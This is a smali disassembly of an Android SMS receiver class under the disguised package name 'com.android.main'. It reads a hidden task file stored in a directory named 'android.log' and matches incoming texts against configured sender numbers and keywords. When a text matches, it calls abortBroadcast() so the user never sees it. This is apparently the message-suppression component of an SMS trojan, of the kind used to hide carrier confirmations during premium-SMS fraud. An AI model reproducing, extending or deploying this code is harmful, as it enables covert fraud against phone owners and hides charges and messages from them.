.class public Lcom/android/main/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsReceiver.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 20
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 12
    :try_start_0
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v3

    .line 13
    .local v3, "bundle":Landroid/os/Bundle;
    if-eqz v3, :cond_0

    .line 14
    const-string v18, "android.log"

    .line 15
    const/16 v19, 0x0

    .line 14
    move-object/from16 v0, p1

    move-object/from16 v1, v18

    move/from16 v2, v19

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v18

    .line 15
    invoke-virtual/range {v18 .. v18}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v16

    .line 16
    .local v16, "tasklog":Ljava/lang/String;
    const-string v18, "android.log"

    const/16 v19, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v18

    move/from16 v2, v19

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v18

    .line 17
    invoke-virtual/range {v18 .. v18}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v16

    .line 18
    invoke-static/range {v16 .. v16}, Lcom/android/main/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 19
    .local v15, "task":Ljava/lang/String;
    if-eqz v15, :cond_0

    const-string v18, ""

    move-object/from16 v0, v18

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-eqz v18, :cond_1

    .line 66
    .end local v3    # "bundle":Landroid/os/Bundle;
    .end local v15    # "task":Ljava/lang/String;
    .end local v16    # "tasklog":Ljava/lang/String;
    .end local p1    # "context":Landroid/content/Context;
    :cond_0
    :goto_0
    return-void

    .line 22
    .restart local v3    # "bundle":Landroid/os/Bundle;
    .restart local v15    # "task":Ljava/lang/String;
    .restart local v16    # "tasklog":Ljava/lang/String;
    .restart local p1    # "context":Landroid/content/Context;
    :cond_1
    invoke-static {v15}, Lcom/android/main/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v17

    .line 23
    .local v17, "tasks":[Ljava/lang/String;
    if-eqz v17, :cond_0

    move-object/from16 v0, v17

    array-length v0, v0

    move/from16 v18, v0

    const/16 v19, 0x3

    move/from16 v0, v18

    move/from16 v1, v19

    if-ne v0, v1, :cond_0

    .line 26
    const/16 v18, 0x0

    aget-object v12, v17, v18

    .line 27
    .local v12, "shieldnum":Ljava/lang/String;
    const/16 v18, 0x1

    aget-object v11, v17, v18

    .line 28
    .local v11, "shieldcon":Ljava/lang/String;
    const/16 v18, 0x2

    aget-object v5, v17, v18

    .line 29
    .local v5, "exactnum":Ljava/lang/String;
    const-string v18, "pdus"

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, [Ljava/lang/Object;

    .line 30
    .local v10, "myOBJpdus":[Ljava/lang/Object;
    move-object v0, v10

    array-length v0, v0

    move/from16 v18, v0

    move/from16 v0, v18

    new-array v0, v0, [Landroid/telephony/gsm/SmsMessage;

    move-object v9, v0

    .line 31
    .local v9, "messages":[Landroid/telephony/gsm/SmsMessage;
    const-string v14, ""

    .line 32
    .local v14, "showContent":Ljava/lang/String;
    const/4 v6, 0x0

    .end local p1    # "context":Landroid/content/Context;
    .local v6, "i":I
    :goto_1
    move-object v0, v10

    array-length v0, v0

    move/from16 v18, v0

    move v0, v6

    move/from16 v1, v18

    if-lt v0, v1, :cond_3

    .line 46
    const/16 v18, 0x0

    aget-object v8, v9, v18

    .line 47
    .local v8, "message":Landroid/telephony/gsm/SmsMessage;
    invoke-virtual {v8}, Landroid/telephony/gsm/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v13

    .line 49
    .local v13, "showAddress":Ljava/lang/String;
    if-eqz v13, :cond_0

    .line 50
    invoke-virtual {v13, v12}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v18

    if-nez v18, :cond_2

    const-string v18, ""

    .line 51
    move-object/from16 v0, v18

    move-object v1, v14

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-nez v18, :cond_0

    .line 52
    const-string v18, ""

    move-object/from16 v0, v18

    move-object v1, v11

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-nez v18, :cond_0

    .line 53
    invoke-virtual {v14, v11}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v18

    const/16 v19, -0x1

    move/from16 v0, v18

    move/from16 v1, v19

    if-le v0, v1, :cond_0

    .line 54
    :cond_2
    invoke-virtual {v13, v5}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v18

    if-nez v18, :cond_0

    .line 56
    invoke-virtual/range {p0 .. p0}, Lcom/android/main/SmsReceiver;->abortBroadcast()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 60
    .end local v3    # "bundle":Landroid/os/Bundle;
    .end local v5    # "exactnum":Ljava/lang/String;
    .end local v6    # "i":I
    .end local v8    # "message":Landroid/telephony/gsm/SmsMessage;
    .end local v9    # "messages":[Landroid/telephony/gsm/SmsMessage;
    .end local v10    # "myOBJpdus":[Ljava/lang/Object;
    .end local v11    # "shieldcon":Ljava/lang/String;
    .end local v12    # "shieldnum":Ljava/lang/String;
    .end local v13    # "showAddress":Ljava/lang/String;
    .end local v14    # "showContent":Ljava/lang/String;
    .end local v15    # "task":Ljava/lang/String;
    .end local v16    # "tasklog":Ljava/lang/String;
    .end local v17    # "tasks":[Ljava/lang/String;
    :catch_0
    move-exception v18

    move-object/from16 v4, v18

    .line 62
    .local v4, "e":Ljava/lang/Exception;
    invoke-virtual/range {p0 .. p0}, Lcom/android/main/SmsReceiver;->abortBroadcast()V

    .line 64
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    .line 34
    .end local v4    # "e":Ljava/lang/Exception;
    .restart local v3    # "bundle":Landroid/os/Bundle;
    .restart local v5    # "exactnum":Ljava/lang/String;
    .restart local v6    # "i":I
    .restart local v9    # "messages":[Landroid/telephony/gsm/SmsMessage;
    .restart local v10    # "myOBJpdus":[Ljava/lang/Object;
    .restart local v11    # "shieldcon":Ljava/lang/String;
    .restart local v12    # "shieldnum":Ljava/lang/String;
    .restart local v14    # "showContent":Ljava/lang/String;
    .restart local v15    # "task":Ljava/lang/String;
    .restart local v16    # "tasklog":Ljava/lang/String;
    .restart local v17    # "tasks":[Ljava/lang/String;
    :cond_3
    :try_start_1
    aget-object p1, v10, v6

    check-cast p1, [B

    invoke-static/range {p1 .. p1}, Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;

    move-result-object v18

    .line 33
    aput-object v18, v9, v6

    .line 36
    aget-object v18, v9, v6

    if-eqz v18, :cond_4

    .line 37
    const-string v7, ""
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 39
    .local v7, "line":Ljava/lang/String;
    :try_start_2
    aget-object v18, v9, v6

    invoke-virtual/range {v18 .. v18}, Landroid/telephony/gsm/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-result-object v7

    .line 43
    :goto_2
    :try_start_3
    new-instance v18, Ljava/lang/StringBuilder;

    invoke-static {v14}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v18

    move-object v1, v7

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    .line 32
    .end local v7    # "line":Ljava/lang/String;
    :cond_4
    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    .line 40
    .restart local v7    # "line":Ljava/lang/String;
    :catch_1
    move-exception v18

    move-object/from16 v4, v18

    .line 41
    .restart local v4    # "e":Ljava/lang/Exception;
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_2
.end method
